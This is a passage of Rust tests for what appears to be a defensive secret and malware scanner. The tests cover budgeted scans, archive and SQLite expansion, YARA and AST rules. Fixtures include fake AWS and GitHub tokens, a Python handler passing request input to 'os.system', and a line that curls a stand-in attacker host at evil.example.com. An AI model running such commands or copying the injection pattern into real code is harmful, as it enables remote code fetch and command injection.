        let store = Store::open_findings(&store_dir).await.unwrap();

        let plan = ScanPlan {
            model: None,
            budget: Some(Budget::Fraction(0.5)),
            ..Default::default()
        };
        let summary = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan)
            .await
            .unwrap();

        assert_eq!(summary.candidates, 20, "the walk found every file");
        assert_eq!(summary.files, 10, "but only half were examined");
        assert_eq!(summary.skipped, 10);
        assert!(summary.is_partial(), "a half scan must know it is partial");
        assert!((summary.coverage() - 0.5).abs() < 1e-9);

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn a_full_budget_is_not_a_partial_scan() {
        let (store_dir, tree) = ranked_tree("full", 5);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        let plan = ScanPlan {
            model: None,
            budget: Some(Budget::Fraction(1.0)),
            ..Default::default()
        };
        let summary = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan)
            .await
            .unwrap();
        assert_eq!(summary.skipped, 0);
        assert!(!summary.is_partial());
        assert_eq!(summary.coverage(), 1.0);
        assert_eq!(summary.files, 10);

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    /// The payoff: with a model that knows `secrets/` is risky, a half-budget
    /// scan should find substantially more than half of the findings.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_model_makes_a_partial_scan_find_more_than_its_share() {
        let (store_dir, tree) = ranked_tree("model", 12);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        // Train on labelled paths of the same shape as the tree.
        let mut samples = Vec::new();
        for i in 0..60 {
            samples.push((format!("/t/secrets/k{i}.env"), true));
            samples.push((format!("/t/docs/d{i}.md"), false));
        }
        let model = exfil_hmm::train(&samples, &exfil_hmm::TrainConfig::default());

        let plan = ScanPlan {
            model: Some(model),
            budget: Some(Budget::Fraction(0.5)),
            ..Default::default()
        };
        let summary = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan)
            .await
            .unwrap();

        assert_eq!(summary.skipped, 12, "half of 24 files left unexamined");
        // A blind half-scan would average 6 of the 12 secrets. Ranking should
        // do far better than chance.
        assert!(
            summary.matches >= 10,
            "ranked half-scan found only {} of 12 secrets",
            summary.matches
        );

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn ranked_and_streaming_walks_agree_when_nothing_is_capped() {
        let (store_a, tree) = ranked_tree("agree", 6);
        let store_b = store_a.parent().unwrap().join("store-b");
        let pipeline = default_pipeline().unwrap();

        let a = Store::open_findings(&store_a).await.unwrap();
        let streamed = scan(&tree, &pipeline, &a, Some(&store_a), None)
            .await
            .unwrap();

        let b = Store::open_findings(&store_b).await.unwrap();
        let plan = ScanPlan {
            model: None,
            budget: Some(Budget::Fraction(1.0)),
            ..Default::default()
        };
        let ranked = scan_with_plan(&tree, &pipeline, &b, Some(&store_b), None, &plan)
            .await
            .unwrap();

        assert_eq!(streamed.files, ranked.files);
        assert_eq!(streamed.matches, ranked.matches);
        assert_eq!(streamed.errors, ranked.errors);

        let _ = std::fs::remove_dir_all(store_a.parent().unwrap());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn changed_files_outrank_unchanged_ones_on_a_rescan() {
        let (store_dir, tree) = ranked_tree("rescan", 8);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        // Full first scan, so everything is in the index.
        scan(&tree, &pipeline, &store, Some(&store_dir), None)
            .await
            .unwrap();

        // Touch one doc so it is the only changed file, then rescan with a
        // budget that only allows a couple of files.
        let touched = tree.join("docs/d0.md");
        std::fs::write(&touched, "prose plus AWS_KEY=AKIA0123456789ABCDEF\n").unwrap();

        let plan = ScanPlan {
            model: None,
            budget: Some(Budget::Files(2)),
            ..Default::default()
        };
        let summary = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan)
            .await
            .unwrap();

        // The changed file must be one of the two examined — a fact from the
        // stat index outranks any model score.
        assert_eq!(
            summary.matches, 1,
            "the touched file's new secret was found"
        );
        assert_eq!(summary.skipped, 14);

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scans_a_tree_and_persists_findings() {
        let base = std::env::temp_dir().join(format!("exfil-engine-test-{}", std::process::id()));
        let tree = base.join("tree");
        // The store lives INSIDE the scanned tree: its files must be excluded
        // from the walk (by canonical path, not by name).
        let store_dir = tree.join("store");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(tree.join("sub")).unwrap();

        std::fs::write(tree.join("clean.txt"), "nothing to see here\n").unwrap();
        std::fs::write(tree.join("sub/leak.env"), "AWS_KEY=AKIA0123456789ABCDEF\n").unwrap();
        std::fs::write(tree.join("blob.bin"), [0u8, 159, 146, 150, 65]).unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        // With an event channel attached, the scan reports its progress live.
        let (ev_tx, ev_rx) = mpsc::channel();
        let summary = scan(&tree, &pipeline, &store, Some(&store_dir), Some(ev_tx))
            .await
            .unwrap();
        let events: Vec<ScanEvent> = ev_rx.try_iter().collect();
        assert!(
            matches!(events.first(), Some(ScanEvent::Total(3))),
            "Total is sent first: {events:?}"
        );
        let ticks = events
            .iter()
            .filter(|e| matches!(e, ScanEvent::FileDone))
            .count();
        let hits = events
            .iter()
            .filter(|e| matches!(e, ScanEvent::Match(_)))
            .count();
        assert_eq!(ticks, 3);
        assert_eq!(hits, 1);
        assert_eq!(summary.files, 3, "all regular files recorded");
        assert_eq!(summary.matches, 1, "one secret found");
        assert_eq!(summary.errors, 0);

        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].path.ends_with("leak.env"));
        assert_eq!(found[0].line, 1);

        // The file record is retrievable by its content hash.
        let hash = blake3::hash(b"AWS_KEY=AKIA0123456789ABCDEF\n")
            .to_hex()
            .to_string();
        let rec = store
            .get_record(&format!("file:{hash}"))
            .await
            .unwrap()
            .expect("file record by content hash");
        assert!(rec["path"].as_str().unwrap().ends_with("leak.env"));

        // Rescan without touching anything: every file takes the stat
        // fast-path and findings do NOT duplicate.
        let second = scan(&tree, &pipeline, &store, Some(&store_dir), None)
            .await
            .unwrap();
        assert_eq!(second.files, 3);
        assert_eq!(second.unchanged, 3, "nothing changed → nothing re-read");
        assert_eq!(second.matches, 0, "no files re-scanned");
        let found = store.search_findings("").await.unwrap();
        assert_eq!(found.len(), 1, "rescan must not duplicate findings");

        // Modify the leaky file: it is re-read and its findings replaced.
        std::fs::write(
            tree.join("sub/leak.env"),
            "AWS_KEY=AKIA0123456789ABCDEF\ntoken = \"ghp_abcdefghijklmnopqrstuvwxyz0123456789\"\n",
        )
        .unwrap();
        let third = scan(&tree, &pipeline, &store, Some(&store_dir), None)
            .await
            .unwrap();
        assert_eq!(third.unchanged, 2, "only the modified file is re-read");
        assert_eq!(third.matches, 2, "both secrets in the new content");
        let found = store.search_findings("").await.unwrap();
        // The new content contributes exactly two findings; the old content's
        // single finding stays attached to the now-orphaned old hash until gc.
        assert_eq!(found.len(), 3, "{found:?}");
        let github = found.iter().filter(|m| m.rule == "github-token").count();
        assert_eq!(github, 1, "{found:?}");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread")]
    async fn unreadable_files_are_counted_not_fatal() {
        use std::os::unix::fs::PermissionsExt;

        let base = std::env::temp_dir().join(format!(
            "exfil-engine-test-unreadable-{}",
            std::process::id()
        ));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();

        std::fs::write(tree.join("ok.txt"), "fine\n").unwrap();
        let locked = tree.join("locked.txt");
        std::fs::write(&locked, "secret\n").unwrap();
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, None, None).await.unwrap();

        if nix_is_root() {
            // root reads everything; the error branch can't trigger.
            assert_eq!(summary.files, 2);
        } else {
            assert_eq!(summary.files, 1);
            assert_eq!(summary.errors, 1);
        }

        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o644)).unwrap();
        let _ = std::fs::remove_dir_all(&base);
    }

    /// An in-memory RemoteFs for testing scan_remote without a network.
    struct MemoryFs {
        host: String,
        files: std::collections::HashMap<String, Vec<u8>>,
    }

    #[async_trait::async_trait]
    impl RemoteFs for MemoryFs {
        fn host(&self) -> &str {
            &self.host
        }
        async fn list(&self, root: &str) -> Result<Vec<String>> {
            Ok(self
                .files
                .keys()
                .filter(|p| p.starts_with(root))
                .cloned()
                .collect())
        }
        async fn read(&self, path: &str) -> Result<Vec<u8>> {
            self.files
                .get(path)
                .cloned()
                .ok_or_else(|| anyhow::anyhow!("no such remote file {path}"))
        }
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scan_remote_finds_and_tags_host() {
        let base = std::env::temp_dir().join(format!("exfil-remote-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let mut files = std::collections::HashMap::new();
        files.insert(
            "/srv/app/.env".to_string(),
            b"AWS=AKIA0123456789ABCDEF\n".to_vec(),
        );
        files.insert("/srv/app/readme.md".to_string(), b"nothing\n".to_vec());
        let fs = MemoryFs {
            host: "prod-web-1".into(),
            files,
        };

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base).await.unwrap();
        let summary = scan_remote(&fs, "/srv", &pipeline, &store, None)
            .await
            .unwrap();
        assert_eq!(summary.files, 2);
        assert_eq!(summary.matches, 1);

        // The finding is recorded, tagged with the remote host on its file.
        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].path, "/srv/app/.env");
        let hash = blake3::hash(b"AWS=AKIA0123456789ABCDEF\n")
            .to_hex()
            .to_string();
        let rec = store
            .get_record(&format!("file:{hash}"))
            .await
            .unwrap()
            .unwrap();
        assert_eq!(rec["host"], "prod-web-1");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scan_remote_counts_unreadable_files() {
        let base = std::env::temp_dir().join(format!("exfil-remote-err-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        // list() reports a file that read() then fails on.
        struct FlakyFs;
        #[async_trait::async_trait]
        impl RemoteFs for FlakyFs {
            fn host(&self) -> &str {
                "host"
            }
            async fn list(&self, _root: &str) -> Result<Vec<String>> {
                Ok(vec!["/a".into(), "/b".into()])
            }
            async fn read(&self, path: &str) -> Result<Vec<u8>> {
                if path == "/a" {
                    Ok(b"ok\n".to_vec())
                } else {
                    anyhow::bail!("permission denied")
                }
            }
        }
        let store = Store::open_findings(&base).await.unwrap();
        let pipeline = default_pipeline().unwrap();
        let summary = scan_remote(&FlakyFs, "/", &pipeline, &store, None)
            .await
            .unwrap();
        assert_eq!(summary.files, 1);
        assert_eq!(summary.errors, 1);
        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn yara_still_matches_binary_content_but_regex_does_not() {
        // A "binary" file (starts with a NUL byte) carrying both a YARA
        // string match and a plain secret pattern the regex scanner would
        // otherwise catch. YARA (binary_safe) must still fire; the built-in
        // regex ruleset (not binary_safe) must not, since it's given no
        // chance to run on binary content at all.
        let base = std::env::temp_dir().join(format!("exfil-engine-binary-{}", std::process::id()));
        let tree = base.join("tree");
        let store_dir = tree.join("store");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();
        let mut content = vec![0u8]; // NUL byte marks this as binary
        content.extend_from_slice(b"EVILMARKER AWS=AKIA0123456789ABCDEF\n");
        std::fs::write(tree.join("blob.bin"), &content).unwrap();

        let yara_rules = r#"
rule Detect_Evil {
    strings:
        $a = "EVILMARKER"
    condition:
        $a
}
"#;
        let (pipeline, skipped) =
            exfil_scan::pipeline_with_rules(exfil_scan::builtin_rules(), "", yara_rules).unwrap();
        assert!(skipped.is_empty());
        let store = Store::open_findings(&store_dir).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, Some(&store_dir), None)
            .await
            .unwrap();
        assert_eq!(summary.files, 1);

        let found = store.search_findings("").await.unwrap();
        let rules: Vec<&str> = found.iter().map(|m| m.rule.as_str()).collect();
        assert!(
            rules.iter().any(|r| r.starts_with("yara:")),
            "YARA must still match binary content: {rules:?}"
        );
        assert!(
            !rules.iter().any(|r| r.contains("aws")),
            "the regex scanner must not run on binary content: {rules:?}"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn gc_prunes_superseded_scan_and_files() {
        let base = std::env::temp_dir().join(format!("exfil-engine-gc-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();
        std::fs::write(tree.join("a.env"), "AWS=AKIA0123456789ABCDEF\n").unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // Change the file's *size* (defeats the stat fast-path regardless of
        // mtime resolution), then rescan → a second content version + scan.
        std::fs::write(
            tree.join("a.env"),
            "AWS=AKIA9999999999999999 plus extra bytes to change size\n",
        )
        .unwrap();
        scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // Two file versions and two scans exist before gc.
        let (files_before, scans_before) = store.counts().await.unwrap();
        assert_eq!(scans_before, 2);
        assert_eq!(files_before, 2, "old + new content versions");

        let stats = store.gc().await.unwrap();
        assert_eq!(stats.scans, 1, "one old scan pruned");
        assert_eq!(stats.files, 1, "one stale file pruned");

        // The current finding survives; the superseded one is gone.
        let (files_after, scans_after) = store.counts().await.unwrap();
        assert_eq!((files_after, scans_after), (1, 1));
        let found = store.search_findings("").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].snippet.contains("AKIA9999999999999999"));

        // gc is idempotent: a second pass removes nothing.
        assert_eq!(store.gc().await.unwrap(), Default::default());

        let _ = std::fs::remove_dir_all(&base);
    }

    #[cfg(unix)]
    fn nix_is_root() -> bool {
        std::fs::metadata("/proc/self")
            .map(|m| {
                use std::os::unix::fs::MetadataExt;
                m.uid() == 0
            })
            .unwrap_or(false)
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn ast_scanner_flags_dangerous_calls_and_stores_ast() {
        let base =
            std::env::temp_dir().join(format!("exfil-engine-test-ast-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();
        std::fs::write(
            tree.join("handler.py"),
            "def handle(req):\n    return os.system(req)\n",
        )
        .unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // The dangerous call is flagged from the parse tree, not by regex.
        let found = store.search_findings("rule=ast-os-command").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].path.ends_with("handler.py"));

        // The file's AST was persisted and linked with has_ast.
        let hash = blake3::hash(b"def handle(req):\n    return os.system(req)\n")
            .to_hex()
            .to_string();
        let mut res = store
            .db()
            .query("SELECT count() AS n FROM has_ast WHERE in = type::thing('file', $h) GROUP ALL")
            .bind(("h", hash.clone()))
            .await
            .unwrap();
        let rows: Vec<serde_json::Value> = res.take(0).unwrap();
        assert_eq!(rows[0]["n"], 1, "file linked to its ast");

        // Navigation: from the file node, neighbors reach its ast and the
        // finding found in it (edge-following, both directions).
        let file_id = format!("file:{hash}");
        let neigh = store.neighbors(&file_id).await.unwrap();
        assert!(
            neigh
                .iter()
                .any(|n| n.kind == "ast" && n.rel == "has_ast" && n.outgoing),
            "{neigh:?}"
        );
        assert!(
            neigh
                .iter()
                .any(|n| n.kind == "finding" && n.rel == "in_file" && !n.outgoing),
            "{neigh:?}"
        );
        // And from that finding, a neighbor hops back to the file.
        let finding = neigh.iter().find(|n| n.kind == "finding").unwrap();
        let back = store.neighbors(&finding.id).await.unwrap();
        assert!(back.iter().any(|n| n.id == file_id), "{back:?}");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn streamed_hash_matches_the_in_memory_hash() {
        // Oversize files get their hash from `hash_file_streaming` while every
        // other file gets it from `blake3::hash`. If the two ever disagreed,
        // the stat fast-path and container links would silently break, so pin
        // them together — including at the chunk boundary, where a bug in the
        // read loop would show up first.
        let base = std::env::temp_dir().join(format!("exfil-engine-hash-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();

        for (name, len) in [
            ("empty", 0),
            ("small", 100),
            ("one-chunk-minus-1", HASH_CHUNK - 1),
            ("exactly-one-chunk", HASH_CHUNK),
            ("one-chunk-plus-1", HASH_CHUNK + 1),
            ("several-chunks", HASH_CHUNK * 3 + 7),
        ] {
            // Non-repeating bytes, so a chunk read out of order would change
            // the digest rather than cancel out.
            let content: Vec<u8> = (0..len).map(|i| (i % 251) as u8).collect();
            let path = base.join(name);
            std::fs::write(&path, &content).unwrap();
            assert_eq!(
                hash_file_streaming(&path).unwrap(),
                blake3::hash(&content).to_hex().to_string(),
                "{name} ({len} bytes)"
            );
        }

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn oversize_files_are_recorded_and_hashed_but_not_scanned() {
        // A sparse file just over MAX_SCAN_BYTES: it costs no real disk, but
        // the engine sees the full length and must take the streaming path.
        let base =
            std::env::temp_dir().join(format!("exfil-engine-oversize-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();

        let big = tree.join("huge.bin");
        let file = std::fs::File::create(&big).unwrap();
        file.set_len(MAX_SCAN_BYTES + 1).unwrap();
        drop(file);
        // A normal-size file alongside it, to prove the cap is per file and
        // does not poison the rest of the scan.
        std::fs::write(tree.join("small.txt"), b"AWS_KEY=AKIA0123456789ABCDEF\n").unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // Both files are recorded — coverage stays complete — and neither is
        // an error.
        assert_eq!(summary.files, 2, "oversize file still gets a record");
        assert_eq!(summary.errors, 0, "oversize is not an error");

        // The small file is scanned as usual; the oversize one contributes
        // no findings.
        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].path.contains("small.txt"), "{:?}", found[0].path);

        // The oversize file's stored hash is the real digest of its contents,
        // not a placeholder — a rescan depends on it.
        let expected = hash_file_streaming(&big).unwrap();
        let index = store.file_index().await.unwrap();
        let abs = std::fs::canonicalize(&big).unwrap().display().to_string();
        let stat = index.get(&abs).expect("oversize file is in the index");
        assert_eq!(stat.hash, expected, "oversize file keeps a real hash");
        assert_eq!(stat.size, MAX_SCAN_BYTES + 1);

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn text_file_with_a_container_extension_is_still_scanned() {
        // Expanders match on filename alone, so a plain text file named
        // `notes.db` (or `.zip`, …) looks like a container. It expands to
        // nothing — and must then be scanned as the text it is, rather than
        // silently going unscanned because its name implied a container.
        let base =
            std::env::temp_dir().join(format!("exfil-engine-fake-db-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();
        std::fs::write(tree.join("notes.db"), b"AWS_KEY=AKIA0123456789ABCDEF\n").unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, None, None).await.unwrap();
        assert_eq!(summary.files, 1);

        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(
            found.len(),
            1,
            "a text file named .db must still be content-scanned"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scans_inside_archives_and_links_container() {
        use std::io::Write;

        let base =
            std::env::temp_dir().join(format!("exfil-engine-test-zip-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();

        // A zip containing a secret; the secret is not present anywhere on disk.
        let mut zip_bytes = Vec::new();
        {
            let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_bytes));
            let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default();
            w.start_file("app/.env", opts).unwrap();
            w.write_all(b"AWS_KEY=AKIA0123456789ABCDEF\n").unwrap();
            w.finish().unwrap();
        }
        std::fs::write(tree.join("dist.zip"), &zip_bytes).unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // The archive plus its one inner file are both recorded.
        assert_eq!(summary.files, 2, "archive + inner file");
        // The secret inside the archive is found.
        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].path.contains("dist.zip!"), "{:?}", found[0].path);

        // The inner file is linked to its container via contained_in.
        let inner_hash = blake3::hash(b"AWS_KEY=AKIA0123456789ABCDEF\n")
            .to_hex()
            .to_string();
        let container_hash = blake3::hash(&zip_bytes).to_hex().to_string();
        let mut res = store
            .db()
            .query(
                "SELECT count() AS n FROM contained_in \
                 WHERE in = type::thing('file', $i) AND out = type::thing('file', $c) GROUP ALL",
            )
            .bind(("i", inner_hash))
            .bind(("c", container_hash))
            .await
            .unwrap();
        let rows: Vec<serde_json::Value> = res.take(0).unwrap();
        assert_eq!(rows[0]["n"], 1, "inner file linked to container");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scans_inside_sqlite_databases_and_links_container() {
        let base =
            std::env::temp_dir().join(format!("exfil-engine-test-sqlite-{}", std::process::id()));
        let tree = base.join("tree");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&tree).unwrap();

        // A SQLite DB with a secret in a row; not present anywhere else on disk.
        let db_path =
            std::env::temp_dir().join(format!("exfil-engine-fixture-{}.db", std::process::id()));
        {
            let conn = rusqlite::Connection::open(&db_path).unwrap();
            conn.execute("CREATE TABLE users (id INTEGER, note TEXT)", [])
                .unwrap();
            conn.execute(
                "INSERT INTO users VALUES (1, 'AWS_KEY=AKIA0123456789ABCDEF')",
                [],
            )
            .unwrap();
        }
        let db_bytes = std::fs::read(&db_path).unwrap();
        let _ = std::fs::remove_file(&db_path);
        std::fs::write(tree.join("app.db"), &db_bytes).unwrap();

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base.join("store")).await.unwrap();
        let summary = scan(&tree, &pipeline, &store, None, None).await.unwrap();

        // The database plus its one expanded table are both recorded.
        assert_eq!(summary.files, 2, "db + expanded table");
        let found = store.search_findings("aws-access-key-id").await.unwrap();
        assert_eq!(found.len(), 1);
        assert!(
            found[0].path.contains("app.db!users"),
            "{:?}",
            found[0].path
        );

        // The expanded table is linked to its container database via contained_in.
        let inner_hash = blake3::hash(b"id=1 note=AWS_KEY=AKIA0123456789ABCDEF\n")
            .to_hex()
            .to_string();
        let container_hash = blake3::hash(&db_bytes).to_hex().to_string();
        let mut res = store
            .db()
            .query(
                "SELECT count() AS n FROM contained_in \
                 WHERE in = type::thing('file', $i) AND out = type::thing('file', $c) GROUP ALL",
            )
            .bind(("i", inner_hash))
            .bind(("c", container_hash))
            .await
            .unwrap();
        let rows: Vec<serde_json::Value> = res.take(0).unwrap();
        assert_eq!(rows[0]["n"], 1, "expanded table linked to its database");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn scan_remote_streams_events_and_stores_ast_and_indicators() {
        let base = std::env::temp_dir().join(format!("exfil-remote-events-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let py = b"import os\nos.system('curl http://evil.example.com/x')\n".to_vec();
        let mut files = std::collections::HashMap::new();
        files.insert("/srv/app.py".to_string(), py);
        let fs = MemoryFs {
            host: "h".into(),
            files,
        };

        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&base).await.unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        let summary = scan_remote(&fs, "/srv", &pipeline, &store, Some(tx))
            .await
            .unwrap();
        assert_eq!(summary.files, 1);
        assert!(summary.matches >= 1, "os.system should be flagged");

        // Progress events were streamed over the channel.
        let events: Vec<_> = rx.into_iter().collect();
        assert!(events.iter().any(|e| matches!(e, ScanEvent::Match(_))));
        assert!(events.iter().any(|e| matches!(e, ScanEvent::FileDone)));

        // The URL's domain was extracted into an indicators node.
        let domains = store.indicator_domains().await.unwrap();
        assert!(
            domains
                .iter()
                .any(|(_, d)| d.iter().any(|x| x.contains("evil.example.com"))),
            "{domains:?}"
        );
        // The python file's AST was stored.
        assert!(!store.list_records("ast", 10).await.unwrap().is_empty());

        let _ = std::fs::remove_dir_all(&base);
    }
    #[tokio::test(flavor = "multi_thread")]
    async fn a_confidence_budget_adapts_to_where_the_risk_is() {
        let (store_dir, tree) = ranked_tree("confidence", 10);
        let pipeline = default_pipeline().unwrap();
        let store = Store::open_findings(&store_dir).await.unwrap();

        let mut samples = Vec::new();
        for i in 0..60 {
            samples.push((format!("/t/secrets/k{i}.env"), true));
            samples.push((format!("/t/docs/d{i}.md"), false));
        }
        let model = exfil_hmm::train(&samples, &exfil_hmm::TrainConfig::default());

        let plan = ScanPlan {
            model: Some(model),
            budget: Some(Budget::Confidence(0.9)),
            ..Default::default()
        };
        let summary = scan_with_plan(&tree, &pipeline, &store, Some(&store_dir), None, &plan)
            .await
            .unwrap();

        // Risk sits in secrets/; 90% of the expected findings should be
        // reachable well short of the whole tree.
        assert!(summary.is_partial(), "should have stopped early");
        assert!(
            summary.matches >= 8,
            "found only {} of 10 secrets at 90% confidence",
            summary.matches
        );

        let _ = std::fs::remove_dir_all(store_dir.parent().unwrap());
    }
}
